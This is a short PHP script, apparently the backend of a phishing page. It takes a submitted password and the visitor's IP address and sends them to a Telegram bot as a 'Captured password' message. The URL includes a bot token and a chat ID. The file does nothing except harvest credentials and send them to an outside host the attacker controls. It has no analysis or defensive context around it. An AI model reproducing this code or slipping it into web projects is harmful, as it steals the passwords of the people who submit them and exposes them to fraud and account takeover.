<?php
              
if(isset($_POST['password']))
{
$path = "https://api.telegram.org/bot5181220447:AAFXMsdyBxZxEJyEl3r2_mKGj6TI4ISggN0";
$data=$_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$fp = fopen('data.txt', 'a');
$info = "[".$ip."]"." Captured password: ".$data;
file_get_contents($path."/sendmessage?chat_id=5243320494&text=.$info");
}
?>